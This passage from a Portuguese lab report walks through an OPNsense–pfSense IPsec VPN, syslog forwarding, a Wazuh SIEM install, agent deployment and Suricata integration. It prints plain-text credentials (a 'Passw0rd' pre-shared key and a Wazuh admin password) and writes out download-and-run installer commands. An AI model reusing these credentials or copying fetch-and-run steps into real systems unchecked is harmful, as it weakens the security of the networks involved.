direta entre a rede Green do MarteSuf (OPNsense) e a rede Green do
VenusSuf (pfSense), garantindo a integridade e confidencialidade dos
dados transmitidos. Ao configurar este túnel entre as duas firewalls,
criamos uma extensão segura do perímetro de rede, permitindo que ambos
os segmentos internos comuniquem como se estivessem na mesma rede
privada.

**Dados das duas firewalls**

  -------------------------------------------------------------------------
                       **MarteSuf (OPNsense)**    **VenusSuf (PFsense)**
  ----------------- -- -------------------------- -------------------------
  WAN IP               10.30.50.130/29            10.20.50.98/29

  Green network        172.30.50.96/28            172.20.50.192/28
  -------------------------------------------------------------------------

### MarteSuf (OPNsense)

##### Pre-Shared Key

Vamos a **VPN à IPsec à Pre-Shared Keys** à clicamos **+**:

-   **Local Identifier**: 10.30.50.130

-   **Remote Identifier**: 10.20.50.98

-   **Pre-Shared Key**: Passw0rd

-   **Type**: PSK

-   **Save**

![](./images/media/image118.png)

*Figura 99 - Configuração da chave pré-partilhada (**PSK**) no OPNsense
para autenticação do túnel **IPsec** entre as firewalls MarteSuf e
VenusSuf.*

**Fase 1 --- Criar a ligação IPSec**

-   Vamos a **VPN à IPsec à Connections**

-   Clicamos **+** para adicionar

-   Preenchemos:

**General settings:**

-   **enabled**: Sim

-   **Proposals**: default

-   **Version**: IKEv2\*

-   **MOBIKE\*\***: Sim

-   **Local addresses**: 10.30.50.130

-   **Local port**: 500 (default) Sim

-   **Remote addresses**: 10.20.50.98

-   **Remote port**: 500 (default) Sim

-   **UDP encapsulation**: Não

-   **Re-auth time**: vazio

-   **Rekey time**: 28800

-   **Description**: IPSec-Marte-Venus

![](./images/media/image119.png)

![](./images/media/image120.png)

![](./images/media/image121.png)

*Figura 100 - Configuração das definições gerais da ligação **IPsec** no
OPNsense, utilizando o protocolo **IKEv2** e especificando o endereço
local da interface WAN (**10.30.50.130**) para estabelecer o túnel com o
VenusSuf.*

\* **IKEv2 (Internet Key Exchange version 2):** É o protocolo de
comunicação que estabelece a ligação segura. É mais moderno, rápido e
estável que o antigo IKEv1, sendo ideal para túneis entre firewalls como
o OPNsense e o pfSense.

\*\* **MOBIKE** (IKEv2 Mobility and Multihoming Protocol): É uma
extensão que permite ao túnel VPN manter-se ativo mesmo que o endereço
IP da interface mude. Garante maior resiliência à ligação se houver uma
quebra temporária ou alteração na rede WAN.

##### Autenticação

Depois de guardar a Connection, vai aparecer um separador novo **\"-\"**
entre Connections e Pools. Clicamos nesse separador e depois em **+**
para adicionar a autenticação:

**Local Authentication** --- clicamos no **+** do meio:

-   **Round**: 1

-   **Authentication**: Pre-Shared Key

-   **Id**: 10.30.50.130

-   **Save**

![](./images/media/image122.png)

*Figura 101 - Configuração dos parâmetros de autenticação local no
OPNsense, onde se define o uso de uma **Pre-Shared Key** e o
identificador IP local (**10.30.50.130**) para validar a
ligação **IPsec** com a firewall VenusSuf.*

**Remote Authentication** --- clicamos no **+** da direita:

-   **Round**: 1

-   **Authentication**: Pre-Shared Key

-   **Id**: 10.20.50.98

-   **Save**

![](./images/media/image123.png)

*Figura 102 - Configuração dos parâmetros de **autenticação remota** no
OPNsense, definindo a chave pré-partilhada (**Pre-Shared Key**) e o
endereço IP da firewall de destino (**10.20.50.98**) para validar o
túnel **IPsec***

##### Child SAs (Phase 2)

Ainda na mesma Connection, procuramos a secção **\"Children\"** ou um
botão **\"+\"** para adicionar Child SA.

A Fase 2, também designada por Child SA no protocolo IKEv2, é a etapa
onde se define o tráfego específico que será protegido pelo túnel. Nesta
fase, especificam-se as sub-redes internas que podem comunicar entre si
(neste caso, a rede Green do MarteSuf e a do VenusSuf) e os algoritmos
de cifra utilizados para encriptar os dados em trânsito. Essencialmente,
enquanto a Fase 1 estabelece a ligação segura entre as firewalls, a Fase
2 cria o canal de comunicação direto para os utilizadores e serviços de
ambas as redes.

**Child SA 1 --- Green MarteSuf ↔ Green VenusSuf**

-   **Mode**: Tunnel

-   **Protocol**: ESP

-   **Local networks**: 172.30.50.96/28

-   **Remote networks**: 172.20.50.192/28

-   **Rekey time**: 3600

-   **Description**: Green-Marte-to-Green-Venus

![](./images/media/image124.png)

![](./images/media/image125.png)

*Figura 103 - Configuração da **Child SA** no OPNsense, onde se definem
as redes internas **Local** (172.30.50.96/28)
e **Remote** (172.20.50.192/28) que comunicarão de forma segura através
do túnel **IPsec**.*

**Child SA 2 --- Green MarteSuf ↔ Orange VenusSuf**

-   **Mode**: Tunnel

-   **Protocol**: ESP

-   **Local networks**: 172.30.50.96/28

-   **Remote networks**: 192.168.50.248/29

-   **Rekey time**: 3600

-   **Description**: Green-Marte-to-Orange-Venus

-   **Save**

![](./images/media/image126.png)

![](./images/media/image127.png)

*Figura 104 - Configuração da **Child SA** no OPNsense para estabelecer
a comunicação segura entre a rede
local **Green-Marte** (172.30.50.96/28) e a rede
remota **Orange-Venus** (192.168.50.248/29).*

![](./images/media/image128.png)

*Figura 105 - Ativação do serviço e aplicação das configurações do
túnel **IPsec-Marte-Venus** no OPNsense para estabelecer a ligação VPN.*

##### Regras de Firewall

Após a configuração das sub-redes e do túnel, é necessário autorizar o
tráfego nas interfaces da firewall para que a VPN comunique com sucesso.
A criação de regras específicas na interface WAN permite que o tráfego
de controlo (IKE) e os dados cifrados provenientes do VenusSuf entrem no
sistema, garantindo o estabelecimento seguro da ligação e a passagem dos
pacotes entre as redes.

**Interface WAN**

**Firewall à Rules à WAN à Add** (3 regras):

**Regra 1 --- IKE:**

-   Action: Pass

-   Protocol: UDP

-   Source: 10.20.50.98

-   Destination: WAN address

-   Destination port: 500

-   Description: Allow IKE from VenusSuf

![](./images/media/image129.png)

![](./images/media/image130.png)

![](./images/media/image131.png)

*Figura 106 - Configuração detalhada da regra de firewall na
interface **WAN** para permitir o tráfego **IKE** (UDP 500) proveniente
do VenusSuf, essencial para o estabelecimento do túnel **IPsec**.*

**Regra 2 --- NAT-T:**

-   Action: Pass

-   Protocol: UDP

-   Source: 10.20.50.98

-   Destination: WAN address

-   Destination port: 4500

-   Description: Allow NAT-T from VenusSuf

![](./images/media/image132.png)

![](./images/media/image133.png)

![](./images/media/image134.png)

*Figura 107 - Configuração da segunda regra de firewall na
interface **WAN** para permitir o tráfego **NAT-T** (UDP 4500)
proveniente do VenusSuf, garantindo a travessia de pacotes IPsec em
redes com tradução de endereços.*

**Regra 3 --- ESP:**

-   Action: Pass

-   Protocol: ESP

-   Source: 10.20.50.98

-   Destination: WAN address

-   Description: Allow ESP from VenusSuf

![](./images/media/image135.png)

![](./images/media/image136.png)

![](./images/media/image137.png)

*Figura 108 - Configuração da terceira regra de firewall na
interface **WAN** para permitir o protocolo **ESP** proveniente do
VenusSuf, assegurando o transporte dos dados encriptados pelo
túnel **IPsec**.*

##### Configurar o Interface IPSec para gerir o tráfego que circula dentro do túnel

Para além das regras na interface WAN, é necessário configurar a
interface virtual IPsec para gerir o tráfego que circula dentro do
túnel. Ao definir uma regra de permissão total nesta interface,
autoriza-se a passagem de pacotes entre as redes internas do MarteSuf e
do VenusSuf, garantindo que os serviços e dispositivos de ambos os lados
consigam comunicar sem restrições após a segurança da ligação ter sido
validada.

**Firewall à Rules à IPsec à Add**:

-   Action: Pass

-   Protocol: any

-   Source: any

-   Destination: any

-   Description: Allow IPSec traffic

![](./images/media/image138.png)

![](./images/media/image139.png)

![](./images/media/image140.png)

*Figura 109 - Configuração da regra de firewall na
interface **IPsec** do OPNsense para permitir todo o tráfego proveniente
do túnel VPN, garantindo a comunicação entre as redes remotas.*

##### Validação da conexão IPsec

![](./images/media/image141.png)

*Figura 110 - Visualização do estado da ligação no OPNsense, confirmando
que o túnel **IPsec** está estabelecido com sucesso tanto na **Fase
1** como na **Fase 2 (INSTALLED)**.*

![](./images/media/image142.png)

*Figura 112 - Realização de testes de conectividade via terminal no
Windows, confirmando a comunicação bem-sucedida entre as redes remotas
através do túnel **IPsec**, com zero pacotes perdidos.*

## Configurar o OPNsense (MarteSuf) para enviar logs para o syslog-ng

Para centralizar a monitorização e facilitar a análise de segurança, o
OPNsense permite o encaminhamento de eventos e alertas para um servidor
de logs externo. Através da configuração do Remote Logging, todos os
registos do sistema e do IDS/ IPS (como o Suricata) são enviados para um
servidor Syslog, garantindo a retenção dos dados e uma visão unificada
do estado da rede numa plataforma de gestão centralizada.

##### Configurar o destino remoto no OPNsense

Vamos a **System à Settings à Logging** à separador **Remote**:

Clicamos **+** para adicionar um novo destino:

-   **Enabled**: Sim

-   **Transport**: UDP(4)

-   **Applications**: Select All *(para enviar todos os logs)*

-   **Levels**: Select All

-   **Facilities**: Select All

-   **Hostname**: 172.20.50.194

-   **Port**: 514

-   **rfc5424**: Sim *(formato padrão syslog)*

-   **Description**: Syslog-NG-Venus

![](./images/media/image143.png)

![](./images/media/image144.png)

*Figura 113 - Configuração do destino de registos remotos no OPNsense,
definindo o porto **514** e o suporte ao padrão **RFC5424** para o envio
de eventos para o servidor **Syslog-NG-Venus**.*

##### Regra de Firewall para Envio de Logs (Syslog)

Para permitir que os registos saiam da rede interna em direção ao
servidor de logs, é necessário criar uma regra de permissão na firewall.
Esta configuração na interface **LAN** autoriza o tráfego **UDP** (porto
514) com origem na rede local e destino ao IP específico do
servidor **Venus-Monitor**, garantindo que as mensagens de sistema não
sejam bloqueadas pelo perímetro de segurança.

Vamos a **Firewall à Rules à LAN** à **Add**:

-   **Action**: Pass

-   **Interface**: LAN

-   **Protocol**: UDP

-   **Source**: LAN net

-   **Destination**: Single host à 172.20.50.194

-   **Destination port**: 514

-   **Description**: Allow Syslog to Venus-Monitor

-   **Save à Apply Changes**

![](./images/media/image145.png)

![](./images/media/image146.png)

![](./images/media/image147.png)

*Figura 114 - Configuração da regra de firewall na
interface **LAN** para autorizar o tráfego **UDP** (porto 514) com
destino ao servidor **Venus-Monitor**, permitindo o encaminhamento de
logs do MarteSuf.*

##### Definir gateway para a interface LAN.

Para garantir o correto encaminhamento de pacotes entre as diferentes
redes, é necessário definir explicitamente os caminhos que o tráfego
deve percorrer. A criação de um **Gateway** na interface **LAN** e a
subsequente adição de uma **Rota Estática** asseguram que
o **OPNsense** saiba exatamente por onde enviar os dados destinados à
rede remota do **VenusSuf**, utilizando o salto (hop) configurado para
alcançar o outro lado do túnel de forma eficiente.

Vamos a **System à Gateways à Configuration à Add**:

-   **Name**: LAN_GW

-   **Interface**: LAN

-   **IP Address**: 172.30.50.97

-   **Description**: LAN Gateway

**Save** e depois vamos a **System à Routes** e adicionamos a rota com o
**LAN_GW** como gateway.

Vamos a **System à Routes à Configuration à Add**:

-   **Network Address**: 172.20.50.192/28

-   **Gateway**: **LAN_GW**

-   **Description**: Route to VenusSuf Green via IPSec

## Configuração de Rota para IPSec --- OPNsense MarteSuf

Para garantir que o tráfego destinado à rede remota é corretamente
encaminhado através do túnel, é necessário configurar um Gateway
específico no OPNsense. Ao definir este salto (hop) na interface LAN com
a opção Far Gateway ativa, instruímos o sistema a reconhecer um ponto de
saída que não pertence à sub-rede local, permitindo que os pacotes
alcancem o destino no VenusSuf de forma eficiente e estruturada através
da infraestrutura de rede estabelecida.

##### Criar o Gateway

Vamos a **System à Gateways à Configuration à Add**:

Selecionamos a **LAN** como interface --- o tráfego IPSec passa pela LAN
para chegar ao túnel.

Preenchemos da seguinte forma:

-   **Name**: IPSec_GW

-   **Interface**: LAN

-   **Address Family**: IPv4

-   **IP Address**: 172.20.50.193 *(IP dentro da rede remota)*

-   **Far Gateway**: Sim

-   **Description**: IPSec Gateway to VenusSuf

**Save à Apply**

![](./images/media/image148.png)

![](./images/media/image149.png)

![](./images/media/image150.png)

*Figura 115 - Configuração final do **IPSec_GW** no OPNsense, definindo
a descrição para o gateway remoto e guardando as definições na
interface **LAN** para assegurar o encaminhamento correto do tráfego
para a rede do VenusSuf.*

##### Adicionar a rota permanente

Para concluir o processo de encaminhamento, é necessário criar uma rota
estática permanente que instrua o sistema sobre o caminho a seguir para
alcançar o destino remoto. Ao associar a rede de destino Green do
VenusSuf (172.20.50.192/28) ao gateway IPSec_GW previamente configurado,
garantimos que todo o tráfego destinado a esse segmento de rede seja
corretamente injetado no túnel VPN, assegurando uma conectividade
persistente entre as duas localizações.

**System à Routes à Configuration à Add**:

-   **Network Address**: 172.20.50.192/28

-   **Gateway**: IPSec_GW

-   **Description**: Route to VenusSuf Green via IPSec

**Save à Apply**

![](./images/media/image151.png)

*Figura 116 - Configuração da rota estática no OPNsense, associando a
rede remota **VenusSuf Green** (172.20.50.192/28) ao
gateway **IPSec_GW** para garantir o encaminhamento correto do tráfego
através da VPN.*

# 

## Linux Mint -- Wazuh Server (alínea 6.2.3.)

No âmbito da monitorização centralizada e resposta a incidentes, foi
implementado um servidor **Wazuh** baseado em **Linux Mint** para atuar
como o **SIEM** (Security Information and Event Management) do projeto.
Este sistema tem como função principal recolher e analisar eventos de
segurança através de agentes instalados em todas as máquinas virtuais,
permitindo a deteção de ameaças em tempo real, como ataques de força
bruta ou varrimento de portas. Além da monitorização, o Wazuh está
configurado para executar respostas ativas, sendo capaz de bloquear IPs
de atacantes ou eliminar ficheiros maliciosos detetados na rede,
garantindo assim uma camada de defesa proativa em toda a infraestrutura.

###  

### Instalação do Linux Mint

A implementação do servidor Wazuh iniciou-se com a instalação do sistema
operativo **Linux Mint**, cujas etapas fundamentais de configuração e
particionamento se encontram documentadas nas figuras que se seguem

![](./images/media/image152.png)

*Figura 117 - Menu de arranque (boot) do suporte de instalação
do **Linux Mint 22**, onde se inicia o processo de carregamento do
sistema para proceder à instalação do servidor **Wazuh**.*

![](./images/media/image153.png)

*Figura 118 - Ambiente de trabalho do **Linux Mint 22** em modo Live,
destacando-se o ícone para iniciar o assistente de instalação definitiva
do sistema operativo no servidor.*

![](./images/media/image154.png)

*Figura 119 - Seleção do **idioma** no assistente de instalação do Linux
Mint para configurar as definições regionais e de teclado do servidor.*

![](./images/media/image155.png)

*Figura 120 - Configuração da disposição do **teclado** no instalador do
Linux Mint, selecionando o esquema em **Português** para garantir a
compatibilidade com o hardware físico durante a utilização do servidor.*

![](./images/media/image156.png)

*Figura 121 - Opção de instalação de **codecs multimédia** no Linux
Mint, selecionada para garantir a compatibilidade com diversos formatos
de ficheiros e suporte completo a conteúdos web no servidor.*

![](./images/media/image157.png)

*Figura 122 - Seleção do **tipo de instalação** no Linux Mint, optando
por apagar o disco e instalar o sistema para uma configuração limpa do
servidor.*

![](./images/media/image158.png)

*Figura 123 - Confirmação das alterações e do particionamento do disco
para iniciar a escrita dos ficheiros do sistema operativo **Linux
Mint**.*

![](./images/media/image159.png)

*Figura 124 - Seleção do **fuso horário** e localização geográfica
(**Lisboa**) no assistente de instalação do Linux Mint.*

![](./images/media/image160.png)

*Figura 125 - Configuração da conta de **utilizador** e do nome da
máquina (**wazuhserver**) no assistente de instalação do Linux Mint.*

![](./images/media/image161.png)

*Figura 126 - Execução do processo de cópia de ficheiros e instalação do
sistema operativo **Linux Mint** no servidor.*

![](./images/media/image162.png)

*Figura 127 - Conclusão da instalação do **Linux Mint**, com a indicação
para **reiniciar** o sistema e finalizar a configuração do servidor.*

![](./images/media/image163.png)

*Figura 128 - Ecrã de início de sessão (login) do **Linux Mint**, onde
se introduz a palavra-passe para aceder ao servidor **wazuhserver**.*

![](./images/media/image164.png)

*Figura 129 - Execução dos comandos de atualização do sistema (sudo apt
update && sudo apt upgrade) no terminal para garantir que o **Linux
Mint** tem todos os pacotes e patches de segurança em dia antes da
instalação do **Wazuh**.*

## Instalação do Wazuh-Manager

Para a implementação da solução de segurança, utilizou-se o assistente
de instalação automatizado do **Wazuh**, seguindo as boas práticas da
documentação oficial. Através da execução de um *script* unificado,
procede-se à instalação e configuração de todos os componentes centrais
--- o **Wazuh Manager**, o **Wazuh Indexer** e o **Wazuh Dashboard** ---
transformando o servidor Linux Mint no núcleo de monitorização e análise
de eventos de toda a infraestrutura de rede.

Podemos aceder, à documentação relativa à instalação, através do
seguinte link:

<https://documentation.wazuh.com/current/quickstart.html>

Iniciou-se a implementação do **Wazuh Manager**, o componente central
responsável pela receção e análise de eventos de toda a infraestrutura.
Para garantir uma instalação íntegra e automatizada de todos os serviços
(Manager, Indexer e Dashboard), executou-se o seguinte comando:

amm@wazuhserver:\~\$ curl -sO
https://packages.wazuh.com/4.14/wazuh-install.sh && sudo

bash ./wazuh-install.sh -a

![](./images/media/image165.png)

*Figura 130 - Instalação do Wazuh-Manager no Linux Mint*

![](./images/media/image166.png)

*Figura 131 - Instalação do Wazuh-Manager no Linux Mint -- User e
Password*

User: admin

Password: iUzdW0DwR+xjmwK3yiPyhIra95OV3y9t

Caso seja necessário, podemos visualizar todas as passwords através do
comando:

amm@wazuhserver:\~\$ sudo tar -O -xvf wazuh-install-files.tar
wazuh-install-files/wazuh-passwords.txt

![](./images/media/image167.png)

*Figura 132 - Instalação do Wazuh-Manager no Linux Mint -- Visualização
das Passwords*

Acedemos ao dashboard do Wazuh através da morada
https://\<wazuh-dashboard-ip\>:443, como

indicado após a instalação.

No meu caso usei a morada: https://172.23.10.2:443

Introduzimos as credenciais que foram providenciadas após a instalação.

![](./images/media/image168.png)

*Figura 133 - Interface de acesso ao **Wazuh Dashboard** no navegador,
onde se realizou o primeiro início de sessão com as credenciais de
administrador para aceder à consola de gestão e monitorização
centralizada.*

![](./images/media/image169.png)

*Figura 134 - Painel de controlo principal (**Overview**) do **Wazuh
Dashboard**, onde é possível visualizar o resumo de alertas por
gravidade e o estado global dos agentes de monitorização da rede.*

## Implementação e Configuração de Agentes Wazuh

Após a consolidação do servidor central, procedeu-se à fase
de **deployment** dos agentes nas diversas máquinas virtuais da
infraestrutura (Windows e Linux). Esta etapa é fundamental para a
monitorização ativa de cada *endpoint*, permitindo que o **Wazuh
Manager** recolha dados sobre integridade de ficheiros, tentativas de
intrusão, inventário de software e conformidade de segurança. Através da
consola de gestão, foram gerados os comandos de instalação
personalizados para cada sistema operativo, garantindo uma integração
rápida e segura de todos os nós da rede no ecossistema de monitorização.

##### Instalação do Wazuh-Agent no Windows Server

No dashboard do Wazuh-Manager, que está instalado no Linux Mint,
selecionamos "Deploy new agent".

![](./images/media/image170.png)

*Figura 135 - Início do assistente de implementação (**Deploy new
agent**) na consola do Wazuh para configurar e gerar o comando de
instalação personalizado para os diversos endpoints da rede.*

Na janela seguinte, escolhemos o sistema operativo e introduzimos o
endereço IP do Wazuh-

Manager, com o qual o Wazuh-Agent do Windows Server irá comunicar.

**manager_address**

"Nome do host ou endereço IP do gestor onde o agente será registado. Se
não for definido nenhum

valor, o agente tentará registar-se no mesmo gestor que foi especificado
para a conexão."

![](./images/media/image171.png)

*Figura 136 - Configuração da implementação de um novo agente
para **Windows**, especificando o endereço IP do servidor Wazuh
(172.30.50.100) para estabelecer a comunicação e o envio de alertas.*

Atribuímos um nome único que identifique o Wazuh-Agent.

Para proceder com a instalação no Windows Server, devemos copiar o
comando que aparece no campo 4, como podemos verificar na figura
seguinte.

![](./images/media/image172.png)

*Figura 137 - Geração do comando personalizado no **Wazuh
Dashboard** para a instalação do agente no Windows, com a atribuição do
nome específico agent-adds.*

No Windows Server, executamos o comando copiado do dashboard do
Wazuh-Manager.

Invoke-WebRequest -Uri
https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.3-1.msi -OutFile
\$env:tmp\\wazuh-agent; msiexec.exe /i \$env:tmp\\wazuh-agent /q
WAZUH_MANAGER=\'172.30.50.100\' WAZUH_AGENT_NAME=\'agent-adds\'

![](./images/media/image173.png)

*Figura 138 - Execução do comando de instalação do agente
no **PowerShell** do Windows Server, realizando o download e a
configuração automática do serviço para comunicação com o
servidor **Wazuh**.*

Para que o Wazuh-Agent inicie automaticamente com o sistema, devemos
executar os comandos

mostrado na figura seguinte.

![](./images/media/image174.png)

*Figura 139 - Execução do comando NET START Wazuh no Windows para ativar
o serviço e iniciar a comunicação oficial entre o agente instalado e o
servidor central.*

![](./images/media/image175.png)

*Figura 140 - Execução do comando NET START wazuh no PowerShell para
iniciar o serviço e confirmar a ativação bem-sucedida do agente no
Windows Server.*

![](./images/media/image176.png)

*Figura 141 - Visualização da lista de agentes no **Wazuh Dashboard**,
confirmando que o agente **agent-adds** (Windows Server 2022) se
encontra no estado **Active** e a comunicar corretamente com o
servidor.*

##### Instalação do Wazuh-Agent no Windows Cliente (winclient -- green zone)

Procedeu-se à instalação do **Wazuh Agent** no **Windows Client** da
zona **Green**, replicando a metodologia de implementação apresentada na
secção anterior. O processo de configuração e a integração bem-sucedida
deste *endpoint* no servidor de monitorização encontram-se documentados
nas figuras seguintes.

![](./images/media/image177.png)

*Figura 142 - Visualização da lista de agentes no **Wazuh Dashboard**,
confirmando o estado **Active** do Windows Server (agent-adds) na
zona **Green**.*

![](./images/media/image178.png)

*Figura 143 - Configuração da implementação do agente **Wazuh** para o
Windows Client na zona **Green**, especificando o endereço IP do
servidor (172.30.50.100) para o estabelecimento da comunicação.*

![](./images/media/image179.png)

*Figura 144 - Geração do comando personalizado no **Wazuh
Dashboard** para a instalação do agente no Windows Client, com a
atribuição do nome específico **agent-winclient**.*

Nota: É necessário abrir o Powershell como Administrator.

![](./images/media/image180.png)

*Figura 145 - Execução do comando de instalação do
agente **Wazuh** no **PowerShell** do Windows Client, realizando o
download do pacote MSI e a configuração automática do serviço com o
nome **agent-winclient**.*

![](./images/media/image181.png)

*Figura 146 - Instrução final no **Wazuh Dashboard** para a ativação do
serviço através do comando NET START Wazuh, garantindo o início da
monitorização no Windows Client.*

![](./images/media/image182.png)

*Figura 147 - Execução do comando NET START wazuh no PowerShell
do **winclient**, confirmando a ativação bem-sucedida do serviço e o
início da monitorização na zona **Green**.*

![](./images/media/image183.png)

*Figura 148 - Visualização da lista de agentes no **Wazuh Dashboard**,
confirmando que ambos os dispositivos
(**agent-adds** e **agent-winclient**) se encontram no
estado **Active** e a comunicar corretamente com o servidor.*

##### Instalação do Wazuh-Agent no Windows 10 (Venus)

Procedeu-se à instalação do Wazuh Agent no Windows Client da zona Green
(**VenusSuf**), replicando a metodologia de implementação apresentada na
secção anterior. O processo de configuração, bem como a verificação da
conectividade através do túnel **IPsec** e a integração bem-sucedida
deste *endpoint* no servidor de monitorização (**MarteSuf**),
encontram-se documentados nas figuras seguintes.

![](./images/media/image184.png)

![](./images/media/image185.png)

![](./images/media/image186.png)

*Figura 150 - Configuração do instalador do Wazuh Agent no Dashboard,
com a definição do pacote Windows e o IP do Manager (172.30.50.100).*

##### Instalação do Wazuh-Agent no Ubuntu Syslog (Venus)

Complementando a monitorização da zona *Green* da firewall **VenusSuf**,
procedeu-se à instalação do **Wazuh-Agent** no servidor **Ubuntu
Syslog**. Esta implementação visa centralizar a recolha de eventos de
sistema e logs de rede deste host, garantindo que qualquer atividade
suspeita ou falha de sistema seja reportada em tempo real ao **Wazuh
Manager**. A utilização do agente nativo em ambiente Linux permite uma
integração profunda com o sistema de ficheiros e processos, reforçando a
postura de segurança e visibilidade sobre os ativos críticos da rede.

![](./images/media/image187.png)

![](./images/media/image188.png)

![](./images/media/image189.png)

*Figura 151 - Sequência de ativação e verificação do Wazuh-Agent no
Ubuntu Syslog.*

![](./images/media/image190.png)

*Figura 152 - Instalação do pacote .deb, ativação do serviço e
verificação do estado active (running) do Wazuh Agent no Ubuntu Syslog.*

##### Instalação do Wazuh-Agent no Ubuntu Nessus (Venus)

De forma a garantir a segurança do servidor de auditoria e
vulnerabilidades, procedeu-se à instalação
do **Wazuh-Agent** no **Ubuntu Nessus**. Sendo este um ponto crítico na
infraestrutura da zona *Green* da **VenusSuf**, a integração com o Wazuh
permite monitorizar em tempo real a integridade do sistema e detetar
tentativas de intrusão que visem comprometer as ferramentas de análise.
O processo seguiu a metodologia de implementação via pacote .deb,
assegurando a comunicação cifrada com o Manager em MarteSuf para
centralização de logs e alertas.

![](./images/media/image191.png)

![](./images/media/image192.png)

![](./images/media/image193.png)

*Figura 153 - Configuração e instruções para instalação do Wazuh-Agent
no Ubuntu Nessus.*

![](./images/media/image194.png)

*Figura 154 - Instalação do pacote .deb, ativação e validação do
estado active (running) do Wazuh Agent via terminal no Ubuntu Nessus.*

##### Instalação do Wazuh-Agent no Win Core (Orange)

Dando continuidade à estratégia de visibilidade total da infraestrutura
em **MarteSuf**, procedeu-se à instalação
do **Wazuh-Agent** no **Windows Server Core** localizado na
zona **Orange (DMZ)**. Sendo este um sistema operativo sem interface
gráfica (CLI-only), a implementação do agente é fundamental para a
monitorização remota e centralizada de segurança. A configuração
focou-se na capacidade do agente para reportar eventos críticos
diretamente ao Manager na zona *Green*, permitindo detetar precocemente
tentativas de movimento lateral ou exploração de serviços expostos nesta
zona de rede.

![](./images/media/image195.png)

![](./images/media/image196.png)

![](./images/media/image197.png)

*Figura 155 - Sequência de configuração e comandos de ativação para o
Wazuh Agent no Windows Core.*

![](./images/media/image198.png)

*Figura 156 - Configuração de rede e execução do script de instalação
via PowerShell no Windows Server Core.*

![](./images/media/image199.png)

*Figura 157 - Instalação e ativação do Wazuh Agent via PowerShell no
Windows Server Core.*

##### Instalação do Wazuh-Agent no Debian-WAF

Para reforçar a segurança da **Zona Orange**, procedeu-se à instalação
do **Wazuh-Agent** no servidor **Debian** que atua como **WAF** (*Web
Application Firewall*). Dada a natureza crítica deste serviço, que
filtra o tráfego externo para as aplicações web, a integração com o
Wazuh é vital para monitorizar ataques aplicacionais e tentativas de
exploração. A implementação foi realizada via repositório oficial,
garantindo que todos os logs de acesso e eventos de segurança do WAF
sejam analisados centralmente pelo Manager, permitindo uma resposta
rápida a incidentes na DMZ.

![](./images/media/image200.png)

![](./images/media/image201.png)

![](./images/media/image202.png)

*Figura 158 - Configuração, parâmetros de registo e instruções de
ativação do Wazuh Agent no Debian-WAF*

![](./images/media/image203.png)

*Figura 159 - Instalação do pacote .deb, ativação e validação do
estado active (running) do Wazuh Agent via terminal no Debian-WAF.*

![](./images/media/image204.png)

*Figura 160 - Dashboard do Wazuh-Manager: Visualização do agente recém
instalado*

![](./images/media/image205.png)

*Figura 161 - Verificação do estado dos agentes no Wazuh Manager.*

## Integração Suricata no Wazuh

O ecossistema Wazuh possui regras nativas para a análise e correlação de
eventos provenientes do IDS/IPS Suricata. Dado que a plataforma OPNsense
não suporta a instalação direta do agente Wazuh, a integração é
realizada através do protocolo Syslog.

Nesta configuração, o Suricata --- a correr na firewall MarteSuf ---
encaminha os alertas de intrusão detetados nas interfaces de rede para o
Wazuh Manager. Este, por sua vez, processa os logs recebidos, permitindo
a centralização e visualização detalhada de ameaças externas e internas
no dashboard de monitorização.

##### Configuração do Wazuh Manager para Receção de Syslog

Para centralizar a monitorização de eventos de rede, procedeu-se à
configuração do **Wazuh Manager** (172.30.50.100) na zona **Green
(MarteSuf)** para atuar como recetor **Syslog**. Através da edição do
ficheiro de configuração **ossec.conf**, habilitou-se a escuta no porto
514 (UDP), permitindo que a firewall **OPNsense** encaminhe diretamente
os alertas gerados pelo **Suricata**. Esta integração é vital para que o
SIEM processe e correlacione o tráfego detetado em todas as interfaces
da firewall, garantindo uma resposta unificada a incidentes de segurança
em toda a infraestrutura de Marte. **No servidor Wazuh (172.30.50.100),
editamos o ficheiro de configuração:**

amm@wazuhserver:\~\$ sudo vim /var/ossec/etc/ossec.conf

**Adicionamos dentro da secção \<ossec_config\>:**

\<remote\>

\<connection\>syslog\</connection\>

\<port\>514\</port\>

\<protocol\>udp\</protocol\>

\<allowed-ips\>172.30.50.97\</allowed-ips\>

\</remote\>

![](./images/media/image206.png)

*Figura 162 - Configuração do protocolo Syslog no ficheiro ossec.conf do
Wazuh Manager.*

Guardamos e reiniciamos o Wazuh:

amm@wazuhserver:\~\$ sudo systemctl restart wazuh-manager

![](./images/media/image207.png)

*Figura 163 - Edição do ficheiro ossec.conf e reinicialização do
serviço wazuh-manager.*

##### Configurar o OPNsense para enviar logs do Suricata para o Wazuh

No OPNsense vamos a **System à Settings à Logging à Remote**:

1.  Clicamos **+** para adicionar

2.  **Transport**: UDP(4)

3.  **Hostname**: 172.30.50.100

4.  **Port**: 514

5.  **Application**: Suricata

6.  **Description**: Wazuh-Suricata

7.  **Save à Apply**

![](./images/media/image208.png)

*Figura 164 - Configuração do destino Syslog no OPNsense para
encaminhamento de logs do Suricata.*

Para testar se o Wazuh-Manager já recebe logs usamos o tcpdump. Fazemos
um ping ou usamos o nmap numa das máquinas para gerar tráfego.

amm@wazuhserver:\~\$ sudo tcpdump -i ens33 udp port 514

![](./images/media/image209.png) *Figura 165 - Verificação da receção de
pacotes Syslog no Wazuh Server.*

Através da ferramenta de análise de pacotes tcpdump, procedeu-se à
validação do fluxo de dados entre o **OPNsense** e o **Wazuh Manager**.
A captura em tempo real no porto **514 (UDP)** confirma a receção de
pacotes com a marcação **local5.warning**, que correspondem aos alertas
críticos gerados pelo motor de deteção **Suricata**. Esta verificação
garante que a cadeia de monitorização está operacional, permitindo que o
motor de análise do Wazuh descodifique e apresente estes eventos no
dashboard de segurança.

##### Implementação do Descodificador (Suricata Decoder)

Procedeu-se à criação de um descodificador personalizado no
ficheiro **suricata_decoder.xml**. Este passo é fundamental para que
o **Wazuh Manager** consiga interpretar e estruturar os dados brutos
recebidos via *syslog*, permitindo a extração de campos críticos como
IPs e assinaturas de ataque para posterior visualização no *dashboard*.

sudo vim /var/ossec/etc/decoders/suricata_decoder.xml

![](./images/media/image210.png)

*Figura 166 - Edição do ficheiro suricata_decoder.xml e reinicialização
do serviço no servidor Wazuh.*

![](./images/media/image211.png) *Figura 167 - Configuração do
descodificador XML para eventos Suricata.*

\<decoder name=\"suricata\"\>

\<program_name\>suricata\</program_name\>

\</decoder\>

\<decoder name=\"suricata-alert\"\>

\<parent\>suricata\</parent\>

\<prematch\>}

![](./images/media/image214.png)

*Figura 170 - Validação do processamento de logs do Suricata através da
ferramenta wazuh-logtest.*

